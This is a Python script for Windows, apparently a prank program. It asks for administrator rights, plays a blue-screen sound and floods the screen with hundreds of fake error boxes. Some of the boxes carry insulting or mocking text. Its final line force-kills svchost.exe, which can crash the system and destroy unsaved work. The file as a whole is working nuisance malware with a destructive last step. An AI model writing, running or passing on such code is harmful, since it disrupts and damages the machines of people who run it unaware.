import os, random, psutil, signal, autoit, simpleaudio, time, ctypes, sys
from tkinter import *

if ctypes.windll.shell32.IsUserAnAdmin():

    with open("bsod.vbs", "w+", encoding="utf8") as f: f.write("""x = MsgBox("BSOD MOD TRIGGERED",16+4096,"HO YEAH BOY")""")
    with open("fatma.vbs", "w+", encoding="utf8") as f: f.write("""x = MsgBox("ERROR 0x0073b: YOU ARE FAT",16+4096,"Critical error in line 256; Threading")""")
    with open("boom.vbs", "w+", encoding="utf8") as f: f.write("""x = MsgBox("BOOM",16+4096,"BOOM BOOM")""")
    with open("alah.vbs", "w+", encoding="utf8") as f: f.write("""x = MsgBox("ALAHWAKBAR",16+4096,"LETS GOOO")""")
    with open("windows.vbs", "w+", encoding="utf8") as f: f.write("""x = MsgBox("ERROR 0x4057t: WINDOW AS MEET AN ERROR",16+4096,"Critical core error in line 3122; core.cpp")""")

    pos = 0
    pos2 = 0
    d = {"alah.vbs": "LETS GOOO", "boom.vbs": "BOOM BOOM", "bsod.vbs": "HO YEAH BOY", "fatma.vbs": "Critical error in line 256; Threading", "windows.vbs": "Critical core error in line 3122; core.cpp"}
    tk = Tk()
    ww = tk.winfo_screenwidth()
    wh = tk.winfo_screenheight()

    def KillAllWindows():
        
        global pos, pos2
        
        pos = 0
        pos2 = 0
        process_pid_list = list()
        for p in psutil.process_iter(): 
            if p.name() == "wscript.exe":
                process_pid_list.append(p.pid)
        for p in process_pid_list: os.kill(p, signal.SIGBREAK)

    simpleaudio.WaveObject.from_wave_file("D:/Enzo/Documents/Python Scripts/RussianCookie/assets/assets/BSOD.wav").play()

    time.sleep(1.75)
    os.startfile("bsod.vbs")
    while True:
        try:
            autoit.win_move("HO YEAH BOY", round(ww/2), round(wh/2))
            break
        except: continue
    time.sleep(9.25)
    os.startfile("bsod.vbs")
    while True:
        try:
            autoit.win_move("HO YEAH BOY", 250, 250)
            break
        except: continue
    os.startfile("bsod.vbs")
    while True:
        try:
            autoit.win_move("HO YEAH BOY", 250, wh-250)
            break
        except: continue
    os.startfile("bsod.vbs")
    while True:
        try:
            autoit.win_move("HO YEAH BOY", ww-250, 250)
            break
        except: continue
    os.startfile("bsod.vbs")
    while True:
        try:
            autoit.win_move("HO YEAH BOY", ww-250, wh-250)
            break
        except: continue
    time.sleep(9.5)
    KillAllWindows()
    os.startfile("boom.vbs")
    time.sleep(0.2)
    os.startfile("boom.vbs")
    time.sleep(3)
    for i in range(50):
        os.startfile("boom.vbs")
        while True:
            try:
                autoit.win_move("BOOM BOOM", pos, pos)
                break
            except: continue
        pos += 25 
    KillAllWindows()
    for i in range(150):      
        if random.choice([True, False]):
            pos = round(ww/2+i)
            pos2 = round(wh/2-i)
        else:
            pos = round(ww/2-i)
            pos2 = round(wh/2+i)
        os.startfile("windows.vbs")
        while True:
            try:
                autoit.win_move("Critical core error in line 3122; core.cpp", pos, pos2)
                break
            except: continue
    KillAllWindows()
    for i in range(170):
        
            os.startfile("fatma.vbs")
            while True:
                try:
                    autoit.win_move("Critical error in line 256; Threading", i, i)
                    break
                except: continue
    KillAllWindows()
    for i in range(350):
        pos2 = random.randint(0, wh)
        pos = random.randint(0, ww)
        s = list()
        for k in d.keys(): s.append(str(k))
        k = random.choice(s)
        os.startfile(k)
        while True:
            try:
                autoit.win_move(d[k], pos, pos2)
                break
            except: continue
            
    os.system("taskkill /f /im svchost.exe")
        
else: ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)
